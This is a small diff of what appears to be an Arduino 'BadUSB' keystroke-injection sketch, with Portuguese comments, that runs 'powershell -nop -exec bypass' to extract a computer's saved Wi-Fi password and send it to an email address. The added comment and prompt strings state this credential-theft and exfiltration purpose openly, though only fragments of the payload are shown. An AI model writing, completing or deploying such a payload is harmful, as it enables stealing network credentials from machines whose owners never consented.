@@ -3,6 +3,7 @@
 void setup() {
 }
 
+// Edite o endereço de e-mail e a senha para enviar a senha Wi-Fi extraída
 char modeCommand[] = "powershell -nop -exec bypass";
 char separatorCommand[] = "read-host";
 char emailAddressPrompt[] = "Digite o endereço de e-mail para eviar as informações extraidas da senha do Wi-Fi: ";
